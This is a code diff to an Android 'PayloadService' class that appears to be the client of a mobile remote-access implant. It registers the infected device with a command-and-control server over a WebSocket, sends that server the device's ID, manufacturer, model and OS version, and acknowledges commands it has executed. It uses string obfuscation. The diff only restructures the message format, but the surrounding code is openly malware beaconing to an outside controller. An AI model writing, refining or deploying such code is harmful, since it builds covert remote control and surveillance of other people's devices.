@@ -136,13 +136,16 @@ class PayloadService : Service() {
         try {
             val registerMsg = JSONObject().apply {
                 put("type", ObfuscatedStrings.msgRegister)
-                put("device_id", Build.ID)
-                put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
-                put("manufacturer", Build.MANUFACTURER)
-                put("model", Build.MODEL)
-                put("android_version", Build.VERSION.RELEASE)
-                put("api_level", Build.VERSION.SDK_INT)
-                put("timestamp", System.currentTimeMillis())
+                val data = JSONObject().apply {
+                    put("device_id", Build.ID)
+                    put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
+                    put("manufacturer", Build.MANUFACTURER)
+                    put("model", Build.MODEL)
+                    put("android_version", Build.VERSION.RELEASE)
+                    put("api_level", Build.VERSION.SDK_INT)
+                    put("timestamp", System.currentTimeMillis())
+                }
+                put("data", data)
             }
             c2WebSocket?.send(registerMsg.toString())
             Log.i(TAG, "Device registered with C2")
@@ -227,9 +230,11 @@ class PayloadService : Service() {
         try {
             val ack = JSONObject().apply {
                 put("type", ObfuscatedStrings.msgCommandAck)
-                put("device_id", Build.ID)
-                put("command_id", commandId)
-                put("status", status)
+                val data = JSONObject().apply {
+                    put("command_id", commandId)
+                    put("status", status)
+                }
+                put("data", data)
             }
             c2WebSocket?.send(ack.toString())
         } catch (e: Exception) {
